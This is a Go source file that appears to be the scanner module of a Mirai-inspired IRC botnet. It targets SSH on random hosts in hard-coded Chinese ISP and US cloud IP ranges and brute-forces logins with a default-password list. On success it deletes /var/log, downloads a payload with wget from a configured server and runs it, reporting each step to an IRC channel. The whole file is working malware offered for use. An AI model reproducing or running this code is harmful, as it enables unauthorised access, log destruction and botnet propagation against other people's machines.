package pkg

import (
	"bytes"
	"fmt"
	"math/rand"
	"net"
	"time"

	"golang.org/x/crypto/ssh"
)

var ScanSwitch bool

var (
	////////////////////////////////////////////////////////////////////////////
	//                         	CHINA ISP/ORG                         	 //
	//////////////////////////////////////////////////////////////////////////

	//CHINANET Hubei province network.
	chpn1 = "116.211" //116.211.255.255
	chpn2 = "119.96"  //119.96.255.255
	chpn3 = "119.97"  //119.97.255.255
	chpn4 = "119.102" //119.102.255.255
	chpn5 = "58.49"   //58.49.255.255
	chpn6 = "58.53"   //58.53.255.255
	chpn7 = "221.234" //221.234.255.255
	chpn8 = "221.235" //221.235.255.255

	//CHINANET Guangdong province network.
	cgpn1 = "14.116" //14.116.255.255
	cgpn2 = "14.118" //14.118.255.255
	cgpn3 = "14.127" //14.127.255.255
	cgpn4 = "14.29"  //14.29.255.255
	cgpn5 = "121.14" //121.14.255.255

	//CHINANET Jiangsu province network.
	cjpn1 = "49.70"   //49.70.255.255
	cjpn2 = "114.230" //114.230.255.255
	cjpn3 = "114.239" //114.239.255.255
	cjpn4 = "117.93"  //117.93.255.255
	cjpn5 = "121.131" //121.131.255.255

	//CHINANET shandong province network.
	cspn1 = "140."   //140.246.0.0 - 140.250.255.255
	cspn2 = "182.42" //182.42.255.255
	cspn3 = "182.43" //182.43.255.255

	//China TieTong Telecommunications Corporation.
	cttc1  = "36.212"  //36.212.255.255
	cttc2  = "36.208"  //36.208.255.255
	cttc3  = "36.209"  //36.209.255.255
	cttc4  = "110.218" //110.218.255.255
	cttc5  = "110.219" //110.219.255.255
	cttc6  = "110.101" //110.101.255.255
	cttc7  = "110.105" //110.105.255.255
	cttc8  = "122.88"  //122.88.255.255
	cttc9  = "122.94"  //122.94.255.255
	cttc10 = "122.95"  //122.95.255.255

	////////////////////////////////////////////////////////////////////////////
	//                         	   USA ISP/ORG                         	 //
	//////////////////////////////////////////////////////////////////////////

	//Amazon.com, Inc.
	az1  = "3.14"   //3.14.255.255
	az2  = "3.20"   //3.20.255.255
	az3  = "3.21"   //3.21.255.255
	az4  = "3.130"  //3.130.255.255
	az5  = "3.131"  //3.131.255.255
	az6  = "3."     //3.139.0.0 - 3.145.255.255
	az7  = "3.209"  //3.209.255.255
	az8  = "44.194" //44.194.255.255
	az9  = "44.235" //44.235.255.255
	az10 = "18.188" //18.188.255.255
	az11 = "18.191" //18.191.255.255
	az12 = "18.212" //18.212.255.255
	az13 = "18."    //18.217.0.0 - 18.220.255.255
	az14 = "18.222" //18.222.255.255
	az15 = "18.233" //18.233.255.255
	az16 = "54.83"  //54.83.255.255
	az17 = "54.86"  //54.86.255.255
	az18 = "54.214" //54.214.255.255
	az19 = "54.162" //54.162.255.255

	//DigitalOcean, LLC
	ocean1  = "64.225"  //64.225.255.255
	ocean2  = "64."     //64.62.0.0 - 64.90.255.255
	ocean3  = "104.198" // 104.198.255.255
	ocean4  = "104.248" // 104.248.255.255
	ocean5  = "35."     //35.188.0.0 - 35.194.255.255
	ocean6  = "35.202"  //35.202.255.255
	ocean7  = "35.224"  //35.224.255.255
	ocean8  = "35.233"  //35.233.255.255
	ocean9  = "35.239"  //35.239.255.255
	ocean10 = "34.68"   //34.68.255.255
	ocean11 = "34.72"   //34.72.255.255
	ocean12 = "34.138"  //34.138.255.255
	ocean13 = "165.227" //165.227.255.255

	//Google LLC
	google1 = "35.188"  //35.188.255.255
	google2 = "35.192"  //35.192.255.255
	google3 = "35.239"  //35.239.255.255
	google4 = "35.243"  //35.243.255.255
	google5 = "34.70"   //34.70.255.255
	google6 = "34."     //34.133.0.0 - 34.136.255.255
	google7 = "104.154" //104.154.255.255
	google8 = "104.197" //104.197.255.255

	////////////////////////////////////////////////////////////////////////////
	//                         	    RANDOM                         	 //
	//////////////////////////////////////////////////////////////////////////

	random string
)

var CN_netList = []string{
	chpn1, chpn2, chpn3, chpn4, chpn5, chpn6, chpn7, chpn8,
	cgpn1, cgpn2, cgpn3, cgpn4, cgpn5,
	cjpn1, cjpn2, cjpn3, cjpn4, cjpn5,
	cspn1, cspn2, cspn3,
	cttc1, cttc2, cttc3, cttc4, cttc5, cttc6, cttc7, cttc8,
	cttc9, cttc10,
}

var USA_netList = []string{
	az1, az2, az3, az4, az5, az6, az7, az8, az9, az10,
	az11, az12, az13, az14, az15, az16, az17, az18, az19,
	ocean1, ocean2, ocean3, ocean4, ocean5, ocean6, ocean7, ocean8, ocean9, ocean10,
	ocean11, ocean12, ocean13,
	google1, google2, google3, google4, google5, google6, google7, google8,
}

var Random_netList = []string{random}

func genRange(max, min int) string {
	rand.Seed(time.Now().UnixNano())
	return fmt.Sprint(rand.Intn(max+1-min) + min)
}

func (scan *SCAN) manageRange(secondRange string) string {
	var ipGen []string
	ipGen = append(ipGen, scan.ipRange)
	ipGen = append(ipGen, secondRange, ".")

	for i := 0; i < 2; i++ {
		ipGen = append(ipGen, genRange(255, 0), ".")
	}

	ipGen[len(ipGen)-1] = ""
	ipGen = append(ipGen, ":22")
	return ipGen[0] + ipGen[1] + ipGen[2] + ipGen[3] +
		ipGen[4] + ipGen[5] + ipGen[6] + ipGen[7]
}

func (scan *SCAN) nextIP() string {
	switch scan.ipRange {
	case cspn1:
		return scan.manageRange(genRange(250, 246))
	case az6:
		return scan.manageRange(genRange(145, 139))
	case az13:
		return scan.manageRange(genRange(220, 217))
	case ocean2:
		return scan.manageRange(genRange(90, 62))
	case ocean5:
		return scan.manageRange(genRange(194, 188))
	case google6:
		return scan.manageRange(genRange(136, 133))
	case Random_netList[0]:
		return scan.manageRange(genRange(255, 0))
	default:
		return scan.manageRange("")
	}
}

func checkPort(_ip string) string {
	ptrIP := &_ip
	conn, err := net.DialTimeout("tcp", *ptrIP, 1*time.Second)
	if err != nil {
		return ""
	}
	conn.Close()
	return *ptrIP
}

func sshConfig(sshName, sshPass string) *ssh.ClientConfig {
	config := &ssh.ClientConfig{
		User: sshName,
		Auth: []ssh.AuthMethod{
			ssh.Password(sshPass),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	return config
}

func (scan *SCAN) sshSession(comd string) {
	session, _ := scan.s_session.NewSession()
	var set_session bytes.Buffer
	session.Stdout = &set_session
	session.Run("echo " + scan.s_paswd + " | sudo -S " + comd)
	session.Close()
}

func (irc *IRC) BotScanner(modes []string, ftp, payload string, isRandom bool) {
	/*
		Thank mirai for these usernames and passwords list. (You are my inspirelation.)
		Add more usernames and passwords in to The slice name "userList" and "paswdList".
	*/
	userList := []string{
		"admin", "root", "user", "guest", "support", "login",
	}

	paswdList := []string{
		"", "admin", "root", "user", "guest", "support", "login", "password",
		"default", "1234", "12345", "123456", "12345678", "123456789", "1234567890", "pass",
		"54321", "123123", "888888", "666666", "00000000", "1111", "111111", "1111111",
		"ikwb", "system", "juantech", "realtek", "smcadmin", "hi3518", "admin1234", "jvbzd",
		"klv123", "klv1234", "xc3511", "vizxv", "xmhdipc", "Zte521", "7ujMko0admin", "7ujMko0vizxv",
	}

	for {
		for net := range modes {
			if isRandom {
				gen := genRange(255, 0) + "."
				if gen == "192." || gen == "127." || gen == "0." || gen == "100." {
					continue
				}
				Random_netList[0] = gen
			}
			scan := &SCAN{
				ipRange: modes[net],
			}
			ip := scan.nextIP()
			_ptrIP := &ip
			rtnIP := checkPort(*_ptrIP)

			if rtnIP == "" {
				checkPort(ip)
			} else {
				irc.IRCreport("Try to login: " + rtnIP)
				var isLogin bool

				for user := range userList {
					for paswd := range paswdList {
						_session, err := ssh.Dial("tcp", rtnIP, sshConfig(userList[user], paswdList[paswd]))
						scan := &SCAN{
							s_session: _session,
							s_paswd:   paswdList[paswd],
						}
						if err == nil {
							irc.IRCreport("Login success: " + rtnIP)
							scan.sshSession("rm -rf /var/log/ && wget -O ." + payload + " " + ftp)
							irc.IRCreport("Loading bot: " + rtnIP)
							go scan.sshSession("chmod +x ." + payload + " && ./." + payload)
							isLogin = true
							break
						} else {
							irc.IRCreport("Failed to login: " + rtnIP + " > " +
								fmt.Sprintf("%v:%v", userList[user], paswdList[paswd]))
						}
					}
					if isLogin || ScanSwitch {
						break
					}
				}
				continue
			}
		}
		if ScanSwitch {
			break
		}
	}
}

func (irc *IRC) ScanMode(modes, ftp, payload string) {
	switch {
	case modes == "-usa":
		irc.BotScanner(USA_netList, ftp, payload, false)
	case modes == "-cn":
		irc.BotScanner(CN_netList, ftp, payload, false)
	case modes == "-r":
		irc.BotScanner(Random_netList, ftp, payload, true)
	}
}
